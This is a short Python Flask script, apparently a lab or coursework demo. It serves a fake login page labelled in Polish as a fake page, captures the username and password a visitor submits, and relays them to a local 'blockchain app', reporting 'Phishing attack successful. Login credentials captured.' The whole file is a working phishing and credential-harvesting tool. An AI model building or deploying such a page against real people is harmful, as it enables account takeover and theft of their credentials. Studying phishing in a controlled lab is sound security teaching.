from flask import Flask, jsonify, request
import requests

app = Flask(__name__)

blockchain_app_address = "http://127.0.0.1:5000"

fake_login_page = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Strona fałszywa</title>
</head>
<body>
    <h2>Strona fałszywa</h2>
    <form action="/login" method="POST">
        <label for="username">Username:</label><br>
        <input type="text" id="username" name="username" required><br>
        <label for="password">Password:</label><br>
        <input type="password" id="password" name="password" required><br><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
'''

@app.route('/')
def index():
    return fake_login_page

@app.route('/login', methods=['POST'])
def login():
    data = request.form
    username = data['username']
    password = data['password']

    response = requests.post(f"{blockchain_app_address}/login", json={"username": username, "password": password})
    if response.status_code == 200:
        return jsonify({"message": "Phishing attack successful. Login credentials captured."})
    else:
        return jsonify({"error": "Phishing attack failed."})

if __name__ == '__main__':
    app.run(debug=True, port=8000)
